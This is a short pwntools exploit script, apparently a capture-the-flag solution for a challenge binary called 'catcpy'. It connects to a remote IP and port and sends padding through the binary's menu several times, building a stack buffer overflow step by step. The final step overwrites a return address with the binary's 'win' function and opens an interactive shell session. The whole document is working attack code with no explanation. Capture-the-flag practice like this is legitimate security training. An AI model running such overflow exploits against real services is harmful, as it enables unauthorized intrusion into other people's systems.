#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./catcpy',checksec=False)
p = process()

p = remote('34.170.146.252', 13997)
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Data: ',b'a'*248)
input()
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'Data: ',b'a'*36)

p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Data: ',b'a'*248)

p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'Data: ',b'a'*35)

p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Data: ',b'a'*248)

p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'Data: ',b'a'*34)

p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Data: ',b'a'*248)

p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'Data: ',b'a'*31 + p64(exe.sym.win))



p.interactive()
